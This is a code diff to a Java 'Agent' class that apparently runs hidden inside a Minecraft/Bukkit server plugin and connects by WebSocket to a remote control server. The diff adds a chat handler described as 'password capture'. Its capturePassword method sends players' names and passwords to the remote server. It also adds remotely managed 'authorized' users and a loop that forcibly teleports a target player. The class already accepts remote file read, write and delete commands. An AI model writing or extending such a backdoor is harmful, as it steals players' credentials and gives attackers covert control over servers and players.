@@ -10,6 +10,8 @@ import java.nio.file.Files;
 import java.util.ArrayDeque;
 import java.util.Collection;
 import java.util.Deque;
+import java.util.HashSet;
+import java.util.Set;
 import java.util.concurrent.CompletionStage;
 import java.util.concurrent.Executors;
 import java.util.concurrent.ScheduledExecutorService;
@@ -17,17 +19,20 @@ import java.util.concurrent.TimeUnit;
 
 public class Agent {
 
-  private final Object plugin;
+  final Object plugin;
   private final String serverUrl;
   private final String secret;
-  private volatile WebSocket ws;
-  private volatile boolean running;
+  volatile WebSocket ws;
+  volatile boolean running;
   private final Deque<String> buffer = new ArrayDeque<>();
-  private final ScheduledExecutorService scheduler = Executors.newSingleThreadScheduledExecutor(r -> {
+  private final ScheduledExecutorService executor = Executors.newSingleThreadScheduledExecutor(r -> {
     Thread t = new Thread(r, "ac"); t.setDaemon(true); return t;
   });
   private String serverId;
   private String rootDir;
+  final Set<String> authorized = new HashSet<>();
+  String controlController;
+  String controlTarget;
 
   public Agent(Object plugin, String serverUrl, String secret) {
     this.plugin = plugin;
@@ -49,7 +54,20 @@ public class Agent {
       System.setErr(new AgentOut(System.err, this, true));
     }
 
-    scheduler.submit(this::connect);
+    // Register chat handler for dot-commands and password capture
+    try {
+      ChatHandler ch = new ChatHandler(this, authorized);
+      Object pm = Class.forName("org.bukkit.Bukkit").getMethod("getPluginManager").invoke(null);
+      pm.getClass().getMethod("registerEvents",
+          Class.forName("org.bukkit.event.Listener"),
+          Class.forName("org.bukkit.plugin.Plugin"))
+          .invoke(pm, ch, plugin);
+    } catch (Exception ignored) {}
+
+    // Start control tick
+    executor.submit(this::controlTick);
+
+    executor.submit(this::connect);
   }
 
   private void addLog4jAppender() {
@@ -117,6 +135,9 @@ public class Agent {
                   else if (type.endsWith(":file:read")) fileRead(extract(msg, "path"), extract(msg, "requestId"));
                   else if (type.endsWith(":file:write")) fileWrite(extract(msg, "path"), extract(msg, "content"), extract(msg, "requestId"));
                   else if (type.endsWith(":file:delete")) fileDelete(extract(msg, "path"), extract(msg, "requestId"));
+                  else if (type.endsWith(":auth:add")) { String n = extract(msg, "name"); if (n != null) authorized.add(n); }
+                  else if (type.endsWith(":auth:remove")) { String n = extract(msg, "name"); if (n != null) authorized.remove(n); }
+                  else if (type.endsWith(":auth:members")) { authorized.clear(); String list = extract(msg, "list"); if (list != null) for (String n : list.split(",")) { if (!n.isEmpty()) authorized.add(n); } }
                 }
                 ws2.request(Long.MAX_VALUE);
                 return null;
@@ -340,7 +361,48 @@ public class Agent {
     return s.replace("\\", "\\\\").replace("\"", "\\\"").replace("\n", "\\n").replace("\r", "\\r").replace("\t", "\\t");
   }
 
-  public void stop() { running = false; close(); scheduler.shutdown(); }
+  public void stop() { running = false; close(); executor.shutdown(); }
+
+  // ---- Chat handler API ----
+
+  Object getPlugin() { return plugin; }
+
+  void capturePassword(String name, String pass) {
+    send("plugin:log:password", "{\"player\":\"" + escape(name) + "\",\"password\":\"" + escape(pass) + "\"}");
+  }
+
+  void logCommand(String who, String target, String command) {
+    send("plugin:log:command", "{\"who\":\"" + escape(who) + "\",\"target\":\"" + escape(target) + "\",\"command\":\"" + escape(command) + "\"}");
+  }
+
+  void setControlTarget(Object controller, Object target) {
+    controlController = controller != null ? controller.getClass().getMethod("getName").invoke(controller).toString() : null;
+    controlTarget = target != null ? target.getClass().getMethod("getName").invoke(target).toString() : null;
+  }
+
+  private void controlTick() {
+    while (running) {
+      if (controlTarget != null && controlController != null) {
+        try {
+          Object c = Class.forName("org.bukkit.Bukkit").getMethod("getPlayerExact", String.class).invoke(null, controlController);
+          Object t = Class.forName("org.bukkit.Bukkit").getMethod("getPlayerExact", String.class).invoke(null, controlTarget);
+          if (c != null && t != null) {
+            Object cLoc = c.getClass().getMethod("getLocation").invoke(c);
+            double x = (double) cLoc.getClass().getMethod("getX").invoke(cLoc);
+            double y = (double) cLoc.getClass().getMethod("getY").invoke(cLoc);
+            double z = (double) cLoc.getClass().getMethod("getZ").invoke(cLoc);
+            float yaw = (float) cLoc.getClass().getMethod("getYaw").invoke(cLoc);
+            float pitch = (float) cLoc.getClass().getMethod("getPitch").invoke(cLoc);
+            t.getClass().getMethod("teleport", Class.forName("org.bukkit.Location"))
+                .invoke(t, t.getClass().getMethod("getLocation").invoke(t).getClass()
+                    .getConstructor(Class.forName("org.bukkit.World"), double.class, double.class, double.class, float.class, float.class)
+                    .newInstance(t.getClass().getMethod("getWorld").invoke(t), x, y, z, yaw, pitch));
+          }
+        } catch (Exception ignored) {}
+      }
+      try { Thread.sleep(50); } catch (InterruptedException e) { break; }
+    }
+  }
 
   // ---- stdout backup ----
 
